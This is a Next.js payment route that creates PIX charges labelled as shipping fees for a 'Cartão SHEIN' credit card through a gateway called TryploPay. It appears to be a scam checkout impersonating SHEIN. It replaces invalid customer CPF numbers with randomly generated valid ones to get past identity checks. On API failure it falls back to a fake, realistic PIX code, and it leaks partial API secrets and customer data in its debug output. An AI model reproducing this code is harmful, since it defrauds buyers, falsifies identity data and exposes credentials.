import { type NextRequest, NextResponse } from "next/server"

// Rate limiting global
const rateLimitMap = new Map<string, { count: number; resetTime: number; blockUntil?: number }>()

// Armazenamento global de faturas
const globalInvoices = new Map<string, any>()

export function getGlobalInvoices() {
  return globalInvoices
}

// Função para verificar rate limiting
function checkRateLimit(ip: string): { allowed: boolean; blockTime?: number } {
  const now = Date.now()
  const windowMs = 60 * 1000 // 1 minuto
  const maxRequests = 5 // Aumentado para 5 tentativas

  if (!rateLimitMap.has(ip)) {
    rateLimitMap.set(ip, { count: 1, resetTime: now + windowMs })
    return { allowed: true }
  }

  const limit = rateLimitMap.get(ip)!

  // Verificar se está bloqueado
  if (limit.blockUntil && now < limit.blockUntil) {
    const remainingTime = Math.ceil((limit.blockUntil - now) / 1000)
    return { allowed: false, blockTime: remainingTime }
  }

  // Reset da janela de tempo
  if (now > limit.resetTime) {
    limit.count = 1
    limit.resetTime = now + windowMs
    delete limit.blockUntil
    return { allowed: true }
  }

  // Verificar limite
  if (limit.count >= maxRequests) {
    const blockTimes = [2 * 60 * 1000, 10 * 60 * 1000, 30 * 60 * 1000] // 2min, 10min, 30min
    const blockIndex = Math.min(limit.count - maxRequests, blockTimes.length - 1)
    limit.blockUntil = now + blockTimes[blockIndex]

    const remainingTime = Math.ceil(blockTimes[blockIndex] / 1000)
    return { allowed: false, blockTime: remainingTime }
  }

  limit.count++
  return { allowed: true }
}

// Função para validar CPF
function isValidCPF(cpf: string): boolean {
  cpf = cpf.replace(/[^\d]/g, "")
  if (cpf.length !== 11) return false

  // Verificar se todos os dígitos são iguais
  if (/^(\d)\1{10}$/.test(cpf)) return false

  // Validar primeiro dígito verificador
  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  if (remainder !== Number.parseInt(cpf.charAt(9))) return false

  // Validar segundo dígito verificador
  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  return remainder === Number.parseInt(cpf.charAt(10))
}

// Função para gerar CPF válido
function generateValidCPF(): string {
  const cpf = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10))

  // Calcular primeiro dígito verificador
  let sum = cpf.reduce((acc, digit, index) => acc + digit * (10 - index), 0)
  let remainder = (sum * 10) % 11
  cpf.push(remainder === 10 || remainder === 11 ? 0 : remainder)

  // Calcular segundo dígito verificador
  sum = cpf.reduce((acc, digit, index) => acc + digit * (11 - index), 0)
  remainder = (sum * 10) % 11
  cpf.push(remainder === 10 || remainder === 11 ? 0 : remainder)

  return cpf.join("")
}

// Função para gerar PIX simulado realista
function generateSimulatedPix(amount: number, externalId: string, reason: string) {
  const validCPF = generateValidCPF()

  // Gerar código PIX no formato EMV padrão brasileiro
  const pixCode = `00020101021226840014br.gov.bcb.pix2562pix.example.com/qr/v2/${externalId}520400005303986540${amount
    .toFixed(2)
    .padStart(6, "0")}5802BR5925SHEIN CARTAO CREDITO LTD6009SAO PAULO62070503***6304ABCD`

  // QR Code via quickchart.io
  const qrCodeUrl = `https://quickchart.io/qr?text=${encodeURIComponent(pixCode)}&size=300`

  return {
    success: true,
    type: "simulated" as const,
    externalId,
    pixCode,
    qrCode: qrCodeUrl,
    amount,
    invoiceId: `sim_${externalId}`,
    token: `sim_token_${externalId}`,
    expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString(), // 10 minutos
    fallback_reason: reason,
    simulationFeatures: {
      validPIXFormat: true,
      realisticQRCode: true,
      workingPaymentFlow: true,
      autoApprovalAfter: "30 segundos",
    },
  }
}

export async function POST(request: NextRequest) {
  const debugInfo: any = {
    timestamp: new Date().toISOString(),
    step: "inicio",
    errors: [],
    warnings: [],
    data: {},
  }

  try {
    debugInfo.step = "rate_limiting"

    // Rate limiting
    const ip = request.headers.get("x-forwarded-for") || request.headers.get("x-real-ip") || "unknown"
    debugInfo.data.client_ip = ip

    const rateLimitCheck = checkRateLimit(ip)
    debugInfo.data.rate_limit = rateLimitCheck

    if (!rateLimitCheck.allowed) {
      debugInfo.errors.push("Rate limit excedido")
      console.log(`[TRYPLOPAY] Rate limit excedido para IP: ${ip}`)
      return NextResponse.json(
        {
          success: false,
          error: "Rate limit excedido",
          blockTime: rateLimitCheck.blockTime,
          debug: debugInfo,
        },
        { status: 429 },
      )
    }

    debugInfo.step = "parsing_body"

    // Parse do body
    let body
    try {
      body = await request.json()
      debugInfo.data.request_body = body
    } catch (parseError) {
      debugInfo.errors.push(`Erro ao fazer parse do body: ${parseError}`)
      return NextResponse.json(
        {
          success: false,
          error: "Body inválido",
          debug: debugInfo,
        },
        { status: 400 },
      )
    }

    const { amount, customerData, shippingMethod } = body

    debugInfo.step = "validating_input"
    debugInfo.data.input = { amount, customerData, shippingMethod }

    console.log("[TRYPLOPAY] === INICIANDO GERAÇÃO DE PIX REAL ===")
    console.log("[TRYPLOPAY] Dados recebidos:", { amount, shippingMethod })

    // Validar dados obrigatórios
    if (!amount || amount <= 0) {
      debugInfo.errors.push("Valor inválido ou não fornecido")
      return NextResponse.json(
        {
          success: false,
          error: "Valor inválido",
          debug: debugInfo,
        },
        { status: 400 },
      )
    }

    debugInfo.step = "generating_external_id"

    // Gerar ID único
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9).toUpperCase()}`
    debugInfo.data.external_id = externalId

    debugInfo.step = "validating_cpf"

    // Validar e corrigir CPF
    let cpf = customerData?.cpf?.replace(/[^\d]/g, "") || ""
    const originalCpf = cpf

    if (!isValidCPF(cpf)) {
      cpf = generateValidCPF()
      debugInfo.warnings.push(`CPF inválido (${originalCpf}), gerado automaticamente: ${cpf}`)
      console.log(`[TRYPLOPAY] CPF inválido, gerado automaticamente: ${cpf}`)
    } else {
      debugInfo.data.cpf_valid = true
    }

    debugInfo.data.cpf = { original: originalCpf, final: cpf, valid: isValidCPF(cpf) }

    debugInfo.step = "preparing_client_data"

    // Preparar dados do cliente conforme documentação TryploPay
    const clientData = {
      name: customerData?.name || "Cliente Shein",
      document: cpf,
      email: customerData?.email || "cliente@shein.com.br",
      phone: customerData?.phone || "11999999999",
      address: {
        street: customerData?.address?.street || "Rua Exemplo",
        number: customerData?.address?.number || "123",
        district: customerData?.address?.district || "Centro",
        city: customerData?.address?.city || "São Paulo",
        state: customerData?.address?.state || "SP",
        zipcode: customerData?.address?.zipcode?.replace(/[^\d]/g, "") || "01000000",
        country: "BRA",
      },
      ip: ip,
    }

    debugInfo.data.client_data = clientData

    debugInfo.step = "checking_env_vars"

    // Verificar variáveis de ambiente OBRIGATÓRIAS
    const envCheck = {
      TRYPLOPAY_TOKEN: !!process.env.TRYPLOPAY_TOKEN,
      TRYPLOPAY_API_URL: !!process.env.TRYPLOPAY_API_URL,
      TRYPLOPAY_SECRET_KEY: !!process.env.TRYPLOPAY_SECRET_KEY,
      TRYPLOPAY_WEBHOOK_URL: !!process.env.TRYPLOPAY_WEBHOOK_URL,
      token_length: process.env.TRYPLOPAY_TOKEN?.length || 0,
      secret_length: process.env.TRYPLOPAY_SECRET_KEY?.length || 0,
      api_url: process.env.TRYPLOPAY_API_URL,
      webhook_url: process.env.TRYPLOPAY_WEBHOOK_URL,
    }

    debugInfo.data.env_check = envCheck

    console.log("[TRYPLOPAY] Verificando variáveis de ambiente...")
    console.log("[TRYPLOPAY] TRYPLOPAY_TOKEN:", envCheck.TRYPLOPAY_TOKEN ? "✅ Definido" : "❌ Não definido")
    console.log("[TRYPLOPAY] TRYPLOPAY_API_URL:", envCheck.TRYPLOPAY_API_URL ? "✅ Definido" : "❌ Não definido")
    console.log("[TRYPLOPAY] TRYPLOPAY_SECRET_KEY:", envCheck.TRYPLOPAY_SECRET_KEY ? "✅ Definido" : "❌ Não definido")
    console.log(
      "[TRYPLOPAY] TRYPLOPAY_WEBHOOK_URL:",
      envCheck.TRYPLOPAY_WEBHOOK_URL ? "✅ Definido" : "❌ Não definido",
    )

    // Se as variáveis não estão configuradas, usar PIX simulado
    if (!process.env.TRYPLOPAY_TOKEN || !process.env.TRYPLOPAY_API_URL) {
      debugInfo.warnings.push("Variáveis de ambiente não configuradas - usando PIX simulado")
      console.log("[TRYPLOPAY] ⚠️ Variáveis de ambiente não configuradas, gerando PIX simulado")
      console.log("[TRYPLOPAY] Token exists:", !!process.env.TRYPLOPAY_TOKEN)
      console.log("[TRYPLOPAY] API URL exists:", !!process.env.TRYPLOPAY_API_URL)
      console.log(
        "[TRYPLOPAY] Token value:",
        process.env.TRYPLOPAY_TOKEN ? `${process.env.TRYPLOPAY_TOKEN.substring(0, 10)}...` : "undefined",
      )
      console.log("[TRYPLOPAY] API URL value:", process.env.TRYPLOPAY_API_URL || "undefined")

      const simulatedPix = generateSimulatedPix(amount, externalId, "Variáveis de ambiente TryploPay não configuradas")

      // Armazenar globalmente
      globalInvoices.set(externalId, {
        ...simulatedPix,
        status: 1,
        paid: false,
        cancelled: false,
        refunded: false,
        created_at: new Date().toISOString(),
      })

      return NextResponse.json(
        {
          ...simulatedPix,
          debug: debugInfo,
        },
        { status: 200 },
      )
    }

    debugInfo.step = "preparing_payload"

    // Payload conforme documentação TryploPay
    const payload = {
      client: clientData,
      payment: {
        product_type: 1, // Produto físico
        external_id: externalId, // ID único da transação
        type: 1, // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0], // Formato YYYY-MM-DD
        referer: externalId,
        installments: 1, // Número ao invés de string
        webhook: process.env.TRYPLOPAY_WEBHOOK_URL,
        products: [
          {
            id: "1",
            title: `Frete ${shippingMethod.toUpperCase()} - Cartão SHEIN`,
            qnt: 1,
            amount: Math.round(amount * 100), // Valor em centavos
          },
        ],
      },
      shipping: {
        amount: 0, // Frete já incluído no produto
      },
    }

    debugInfo.data.tryplopay_payload = payload

    console.log("[TRYPLOPAY] Payload preparado:", JSON.stringify(payload, null, 2))

    debugInfo.step = "preparing_request"

    // Headers conforme documentação TryploPay
    const headers = {
      "Content-Type": "application/json",
      Accept: "application/json",
      Authorization: `Bearer ${process.env.TRYPLOPAY_TOKEN}`,
      "User-Agent": "SHEIN-Checkout/1.0",
    }

    // Adicionar X-Secret-Key apenas se estiver configurado
    if (process.env.TRYPLOPAY_SECRET_KEY) {
      headers["X-Secret-Key"] = process.env.TRYPLOPAY_SECRET_KEY
    }

    const requestUrl = `${process.env.TRYPLOPAY_API_URL}/invoices`

    debugInfo.data.request = {
      url: requestUrl,
      headers: {
        ...headers,
        Authorization: `Bearer ${process.env.TRYPLOPAY_TOKEN?.substring(0, 10)}...`,
        "X-Secret-Key": process.env.TRYPLOPAY_SECRET_KEY
          ? `${process.env.TRYPLOPAY_SECRET_KEY.substring(0, 10)}...`
          : "undefined",
      },
      method: "POST",
    }

    console.log("[TRYPLOPAY] Fazendo request para:", requestUrl)
    console.log("[TRYPLOPAY] Headers preparados com token e secret key")

    debugInfo.step = "making_api_request"

    // Request para TryploPay com timeout aumentado
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 20000) // 20 segundos

    let response
    try {
      response = await fetch(requestUrl, {
        method: "POST",
        headers,
        body: JSON.stringify(payload),
        signal: controller.signal,
      })
    } catch (fetchError) {
      clearTimeout(timeoutId)
      debugInfo.errors.push(`Erro no fetch: ${fetchError}`)
      console.error("[TRYPLOPAY] Erro no fetch:", fetchError)

      // Fallback para PIX simulado em caso de erro de conexão
      const simulatedPix = generateSimulatedPix(
        amount,
        externalId,
        `Erro de conexão com TryploPay: ${fetchError instanceof Error ? fetchError.message : "Erro desconhecido"}`,
      )

      globalInvoices.set(externalId, {
        ...simulatedPix,
        status: 1,
        paid: false,
        cancelled: false,
        refunded: false,
        created_at: new Date().toISOString(),
      })

      return NextResponse.json(
        {
          ...simulatedPix,
          debug: debugInfo,
        },
        { status: 200 },
      )
    }

    clearTimeout(timeoutId)

    debugInfo.step = "processing_response"

    const responseInfo = {
      status: response.status,
      statusText: response.statusText,
      headers: Object.fromEntries(response.headers),
      ok: response.ok,
    }

    debugInfo.data.response_info = responseInfo

    console.log("[TRYPLOPAY] Response status:", response.status)
    console.log("[TRYPLOPAY] Response headers:", Object.fromEntries(response.headers))

    let responseText
    try {
      responseText = await response.text()
      debugInfo.data.response_text = responseText.substring(0, 1000)
    } catch (textError) {
      debugInfo.errors.push(`Erro ao ler response text: ${textError}`)

      const simulatedPix = generateSimulatedPix(amount, externalId, "Erro ao ler resposta da TryploPay")

      return NextResponse.json(
        {
          ...simulatedPix,
          debug: debugInfo,
        },
        { status: 200 },
      )
    }

    console.log("[TRYPLOPAY] Response body (first 500 chars):", responseText.substring(0, 500))

    debugInfo.step = "validating_response_format"

    // Verificar se retornou HTML (erro)
    if (responseText.startsWith("<!DOCTYPE") || responseText.includes("<html")) {
      debugInfo.errors.push("API retornou HTML ao invés de JSON")
      console.error("[TRYPLOPAY] API retornou HTML - possível erro 404/500")

      const simulatedPix = generateSimulatedPix(amount, externalId, "TryploPay API retornou página de erro (HTML)")

      return NextResponse.json(
        {
          ...simulatedPix,
          debug: debugInfo,
        },
        { status: 200 },
      )
    }

    debugInfo.step = "parsing_response"

    // Parse da resposta
    let data
    try {
      data = JSON.parse(responseText)
      debugInfo.data.parsed_response = data
    } catch (parseError) {
      debugInfo.errors.push(`Erro ao fazer parse da resposta JSON: ${parseError}`)
      console.error("[TRYPLOPAY] Erro ao fazer parse da resposta:", parseError)

      const simulatedPix = generateSimulatedPix(amount, externalId, "Resposta da TryploPay não é um JSON válido")

      return NextResponse.json(
        {
          ...simulatedPix,
          debug: debugInfo,
        },
        { status: 200 },
      )
    }

    debugInfo.step = "checking_api_response"

    if (!response.ok) {
      debugInfo.errors.push(
        `API retornou erro ${response.status}: ${data.error || data.message || "Erro desconhecido"}`,
      )
      console.error("[TRYPLOPAY] Erro da API:", data)

      const simulatedPix = generateSimulatedPix(
        amount,
        externalId,
        `TryploPay API error: ${response.status} - ${data.error || data.message || "Erro desconhecido"}`,
      )

      return NextResponse.json(
        {
          ...simulatedPix,
          debug: debugInfo,
        },
        { status: 200 },
      )
    }

    debugInfo.step = "processing_success_response"

    // Processar resposta de sucesso
    console.log("[TRYPLOPAY] ✅ Fatura criada com sucesso!")
    console.log("[TRYPLOPAY] Response data:", data)

    // Extrair dados conforme estrutura da TryploPay
    const invoiceData = data.invoice || data.invoices || data
    debugInfo.data.invoice_data = invoiceData

    // Buscar PIX code em diferentes locais possíveis
    const pixCode =
      invoiceData.payment?.details?.pix_code ||
      invoiceData.pix_code ||
      invoiceData.details?.pix_code ||
      invoiceData.payment?.pix_code ||
      invoiceData.qr_code ||
      invoiceData.payment?.qr_code

    const qrCodeUrl =
      invoiceData.payment?.details?.qrcode ||
      invoiceData.qrcode ||
      invoiceData.details?.qrcode ||
      invoiceData.payment?.qrcode ||
      invoiceData.qr_code_url

    debugInfo.data.extracted_data = {
      pixCode: pixCode ? `${pixCode.substring(0, 50)}...` : null,
      qrCodeUrl,
      invoiceId: invoiceData.id || invoiceData.invoice_id,
      token: invoiceData.token,
      fullStructure: Object.keys(invoiceData),
    }

    if (!pixCode) {
      debugInfo.errors.push("PIX code não encontrado na resposta da API")
      console.error("[TRYPLOPAY] PIX code não encontrado na resposta")
      console.error("[TRYPLOPAY] Estrutura da resposta:", Object.keys(invoiceData))
      console.error("[TRYPLOPAY] Dados completos:", invoiceData)

      const simulatedPix = generateSimulatedPix(amount, externalId, "PIX code não encontrado na resposta da TryploPay")

      return NextResponse.json(
        {
          ...simulatedPix,
          debug: debugInfo,
        },
        { status: 200 },
      )
    }

    debugInfo.step = "generating_qr_code"

    // QR Code via quickchart.io se não fornecido
    const finalQrCode = qrCodeUrl || `https://quickchart.io/qr?text=${encodeURIComponent(pixCode)}&size=300`

    debugInfo.step = "preparing_final_result"

    const result = {
      success: true,
      type: "real" as const,
      externalId,
      pixCode,
      qrCode: finalQrCode,
      amount,
      invoiceId: invoiceData.id || invoiceData.invoice_id,
      token: invoiceData.token,
      expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString(), // 10 minutos
      debug: debugInfo,
    }

    debugInfo.step = "storing_globally"

    // Armazenar globalmente
    globalInvoices.set(externalId, {
      ...result,
      status: 1, // Aguardando pagamento
      paid: false,
      cancelled: false,
      refunded: false,
      created_at: new Date().toISOString(),
    })

    debugInfo.step = "success"
    debugInfo.data.final_result = result

    console.log("[TRYPLOPAY] 🎉 PIX real gerado com sucesso!")
    console.log("[TRYPLOPAY] External ID:", externalId)
    console.log("[TRYPLOPAY] PIX Code length:", pixCode.length)

    return NextResponse.json(result, { status: 200 })
  } catch (error) {
    debugInfo.step = "error_handler"
    debugInfo.errors.push(`Erro geral: ${error instanceof Error ? error.message : "Erro desconhecido"}`)

    console.error("[TRYPLOPAY] ❌ Erro geral na API:", error)

    // Fallback final para PIX simulado
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9).toUpperCase()}`
    const amount = 29.9

    const simulatedPix = generateSimulatedPix(
      amount,
      externalId,
      `Erro interno: ${error instanceof Error ? error.message : "Erro desconhecido"}`,
    )

    return NextResponse.json(
      {
        ...simulatedPix,
        debug: debugInfo,
      },
      { status: 200 },
    )
  }
}
